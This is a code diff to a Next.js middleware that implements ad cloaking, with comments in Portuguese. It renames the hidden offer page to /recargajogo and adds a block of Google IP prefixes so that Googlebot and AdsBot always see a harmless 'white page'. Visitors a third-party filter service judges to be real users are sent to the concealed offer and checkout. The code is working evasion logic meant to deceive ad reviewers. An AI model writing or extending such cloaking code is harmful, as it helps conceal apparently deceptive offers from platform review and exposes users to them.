@@ -10,7 +10,7 @@ if (!CLOAKER_FILTER_ID) {
 const CLOAKER_CONFIG = {
   url: `https://www.altercpa.one/fltr/${CLOAKER_FILTER_ID}`,
   whitePagePath: '/',  // Página principal agora é white page
-  offerPagePath: '/promo'  // Página de oferta
+  offerPagePath: '/recargajogo'  // Página de oferta
 }
 
 // Cache para evitar múltiplas verificações do mesmo usuário
@@ -92,10 +92,10 @@ export async function middleware(request: NextRequest) {
   // Cookie já verificado - sem logs de debug
   
   if (hasValidCookie) {
-    // Se tem cookie mas está acessando a raiz (/) sem referer, redirecionar para /promo
+    // Se tem cookie mas está acessando a raiz (/) sem referer, redirecionar para /recargajogo
     if (pathname === '/' || pathname === '') {
       const referer = request.headers.get('referer') || ''
-      return NextResponse.redirect(new URL('/promo', request.url))
+      return NextResponse.redirect(new URL('/recargajogo', request.url))
     }
     
     // Usuário verificado - pode acessar qualquer rota
@@ -107,7 +107,7 @@ export async function middleware(request: NextRequest) {
     return NextResponse.next()
   }
 
-  // Proteger rota /promo - APENAS acessível com cookie do cloaker
+  // Proteger rota /promo - APENAS acessível com cookie do cloaker (manter proteção para não quebrar links antigos)
   if (pathname === '/promo' || pathname === '/promo/') {
     return NextResponse.redirect(new URL('/', request.url))
   }
@@ -145,7 +145,7 @@ export async function middleware(request: NextRequest) {
     return NextResponse.redirect(new URL('/', request.url))
   }
 
-  // Proteger rota /checkout - APENAS acessível com cookie (vem do /promo)
+  // Proteger rota /checkout - APENAS acessível com cookie (vem do /recargajogo)
   if (pathname.startsWith('/checkout')) {
     return NextResponse.redirect(new URL('/', request.url))
   }
@@ -202,8 +202,24 @@ export async function middleware(request: NextRequest) {
     return NextResponse.next() // Mostrar white page sem chamar cloaker
   }
 
-  // 🚀 CACHE: Verificar se já verificamos este usuário recentemente
+  // 🚀 VERIFICAR IP DO GOOGLE: Bloquear AdsBot que simula usuário real
   const clientIp = request.headers.get('cf-connecting-ip') || request.headers.get('x-forwarded-for') || request.ip || 'unknown'
+  
+  // Verificar se é IP do Google (AdsBot, Googlebot, etc)
+  const isGoogleIP = clientIp.startsWith('2001:4860:') || // IPv6 Google
+                     clientIp.startsWith('66.249.') ||    // Googlebot IPv4
+                     clientIp.startsWith('66.102.') ||    // Google IPv4
+                     clientIp.startsWith('64.233.') ||    // Google IPv4
+                     clientIp.startsWith('72.14.') ||     // Google IPv4
+                     clientIp.startsWith('209.85.') ||    // Google IPv4
+                     clientIp.startsWith('216.239.')      // Google IPv4
+  
+  if (isGoogleIP) {
+    console.log(`🤖 [Cloaker] Bot do Google detectado (IP: ${clientIp}) - mostrando white page`)
+    return NextResponse.next() // Mostrar white page sem chamar cloaker
+  }
+
+  // 🚀 CACHE: Verificar se já verificamos este usuário recentemente
   const userAgent = request.headers.get('user-agent') || ''
   const cacheKey = `${clientIp}-${userAgent.substring(0, 50)}` // Limitar tamanho
   
@@ -213,7 +229,7 @@ export async function middleware(request: NextRequest) {
     if (cached.type === 'white') {
       return NextResponse.next() // Mostrar white page
     } else {
-      // Redirecionar para /promo
+      // Redirecionar para /recargajogo
       const redirectUrl = new URL(CLOAKER_CONFIG.offerPagePath, request.url)
       redirectUrl.search = request.nextUrl.search
       const response = NextResponse.redirect(redirectUrl)
@@ -303,7 +319,7 @@ export async function middleware(request: NextRequest) {
       return NextResponse.next()
     }
 
-    // Se for "black" (usuário real), REDIRECIONAR para /promo com cookie
+    // Se for "black" (usuário real), REDIRECIONAR para /recargajogo com cookie
     
     // Criar URL sem barra final
     const redirectUrl = new URL(CLOAKER_CONFIG.offerPagePath, request.url)
